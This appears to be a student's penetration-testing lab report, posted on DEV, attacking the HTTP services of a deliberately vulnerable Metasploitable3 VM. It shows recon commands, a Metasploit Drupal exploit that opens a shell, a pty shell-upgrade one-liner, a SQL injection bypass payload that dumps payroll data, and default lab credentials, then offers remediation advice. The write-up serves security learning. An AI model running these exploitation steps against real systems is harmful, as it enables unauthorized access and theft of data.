<a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F47r6e55h6fm13lkyvg5f.png"><img alt=" " height="184" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F47r6e55h6fm13lkyvg5f.png" width="625" /></a><br />
...............................................................</p>


<h1>
  
  
  Penetration Testing &amp; Exploitation Report: HTTP Services on Port 80 (Metasploitable3)
</h1>
<h2>
  
  
  1. Reconnaissance and Service Enumeration
</h2>

<ul>
<li>
<strong>Nmap Web Enumeration Scan:</strong> Executed an Nmap service version and script scan targeting port 80 to detect web technologies and list default or interesting directories.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>nmap <span class="nt">--script</span> http-enum <span class="nt">-sV</span> <span class="nt">-p80</span> 10.0.2.15

</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fvcy7ebr5kqinn3itmksz.png"><img alt=" " height="278" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fvcy7ebr5kqinn3itmksz.png" width="800" /></a></p>

<ul>
<li>
<strong>Gobuster Directory Brute-Forcing:</strong> Ran Gobuster with a directory wordlist to discover hidden folders and endpoints hosted on the target web server.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.0.2.15 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F4ru7ajahx9e8dcpyi2b5.png"><img alt=" " height="360" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F4ru7ajahx9e8dcpyi2b5.png" width="799" /></a></p>

<ul>
<li>
<strong>Initializing Metasploit Framework:</strong> Launched the Metasploit console to search and prepare exploits against discovered web applications.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>msfconsole

</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fqkzwbc7zxewservufunq.png"><img alt=" " height="540" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fqkzwbc7zxewservufunq.png" width="713" /></a></p>


<h2>
  
  
  2. Web Application Discovery &amp; Drupal Analysis
</h2>

<ul>
<li>
<strong>Browsing Root Web Directory:</strong> Accessed the target's web server index via browser to view exposed files and directories such as <code>chat</code>, <code>drupal</code>, <code>payroll_app.php</code>, and <code>phpmyadmin</code>.
URL: <code>http://10.0.2.15/</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F9ikbiaz74q80eps4y1lb.png"><img alt=" " height="284" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F9ikbiaz74q80eps4y1lb.png" width="490" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fgs5j9wklhq4ptdgbubam.png"><img alt=" " height="284" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fgs5j9wklhq4ptdgbubam.png" width="490" /></a></p>

<ul>
<li>
<strong>Wappalyzer Technology Identification:</strong> Inspected the web stack of the <code>/drupal/</code> application, confirming it runs Drupal 7 alongside PHP 5.4.5 and Apache.
URL: <code>http://10.0.2.15/drupal/</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1yqvzzm6ptz31qmf3ozd.png"><img alt=" " height="349" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1yqvzzm6ptz31qmf3ozd.png" width="799" /></a></p>

<ul>
<li>
<strong>Inspecting Drupal Interface:</strong> Viewed the Drupal home page and user login portal showing configuration warnings and login fields.
URL: <code>http://10.0.2.15/drupal/</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fcscugir0u1fsg8fg45x0.png"><img alt=" " height="350" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fcscugir0u1fsg8fg45x0.png" width="800" /></a></p>


<h2>
  
  
  3. Drupal Exploitation
</h2>

<ul>
<li>
<strong>Searching Drupal Exploits:</strong> Searched for available Drupal 7 exploitation modules within Metasploit.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>search drupal 7

</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fls18xcuuhqfh4pqiclbj.png"><img alt=" " height="350" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fls18xcuuhqfh4pqiclbj.png" width="799" /></a></p>

<ul>
<li>
<strong>Configuring and Executing Drupal Exploit:</strong> Selected the appropriate Drupal module (<code>exploit/unix/webapp/drupal_coder_exec</code>), configured the target options (<code>rhosts</code> and <code>targeturi</code>), and executed the exploit to successfully open a command shell session as <code>www-data</code>.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>use 0
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">set </span>rhosts 10.0.2.15
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">set </span>targeturi drupal
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>run
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fk3jv7obriailtikyk4o4.png"><img alt=" " height="189" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fk3jv7obriailtikyk4o4.png" width="800" /></a><br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre>

</div>





<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">cd</span> /home
</code></pre>

</div>





<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">pwd</span>

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F288a672pxt95il86d80y.png"><img alt=" " height="320" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F288a672pxt95il86d80y.png" width="800" /></a></p>




<h2>
  
  
  4. Payroll Application SQL Injection
</h2>

<ul>
<li>
<strong>Testing SQL Injection Payload:</strong> Navigated to the payroll application interface and inserted a basic SQL injection payload (<code>'OR 1=1#</code>) into the user field.
URL: <code>http://10.0.2.15/payroll_app.php</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fepz0dqyx5sa8qnzlb5vf.png"><img alt=" " height="349" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fepz0dqyx5sa8qnzlb5vf.png" width="799" /></a></p>

<ul>
<li>
<strong>Bypassing Authentication:</strong> Successfully bypassed authentication via the injection payload, dumping the complete employee salary table with usernames, first names, last names, and salaries.</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F5ngeusb2y1lqswtkclmu.png"><img alt=" " height="321" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F5ngeusb2y1lqswtkclmu.png" width="799" /></a></p>




<h2>
  
  
  5. Database &amp; phpMyAdmin Reconnaissance
</h2>

<ul>
<li>
<strong>Navigating to phpMyAdmin Directory:</strong> Inspected the <code>phpmyadmin</code> folder from the root index of the web server.
URL: <code>http://10.0.2.15/phpmyadmin/</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fpblapgppigwnvneegore.png"><img alt=" " height="284" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fpblapgppigwnvneegore.png" width="490" /></a></p>

<ul>
<li>
<strong>Extracting Database Credentials:</strong> Analyzed configuration files to retrieve database credentials (<code>root:sploitme</code>) for database access and authentication.</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fzhajmiq1o0zxdwyxjhgi.png"><img alt=" " height="350" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fzhajmiq1o0zxdwyxjhgi.png" width="800" /></a></p>

<ul>
<li>
<strong>Accessing phpMyAdmin Interface:</strong> Opened the phpMyAdmin login page to review database structures and configurations.
URL: <code>http://10.0.2.15/phpmyadmin/</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fujm2hbzbz29l9li2wgm3.png"><img alt=" " height="349" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fujm2hbzbz29l9li2wgm3.png" width="800" /></a></p>

<p>..............................................................................................................................<br />
Conclusion<br />
This project highlights the practical application of penetration testing and vulnerability assessment methodologies within the Metasploitable3 environment. Through comprehensive reconnaissance and service enumeration across ports such as SSH (Port 22) and HTTP (Port 80), various security flaws and misconfigurations were identified and successfully exploited to gain unauthorized access and retrieve sensitive data.</p>

<p>Key Takeaways &amp; Remediation Recommendations:<br />
Software Patching: Regularly apply security patches and updates to eliminate known vulnerabilities in content management systems like Drupal and underlying web services.</p>

<p>Credential Management: Avoid default or weak passwords and enforce strict password policies to prevent brute-force attacks against services like SSH.</p>

<p>Web Application &amp; Database Security: Implement robust input validation and parameterized queries to defend against vulnerabilities such as SQL Injection (SQL Injection) and safeguard critical database resources.</p>

<p>Understanding these attack vectors and exploitation techniques is essential for strengthening defensive security posture (Blue Teaming) and building effective defenses against real-world cyber threats.</p>

[Read original article on DEV](https://dev.to/mohammadali_30/penetration-testing-project-report-metasploitable3-bi3)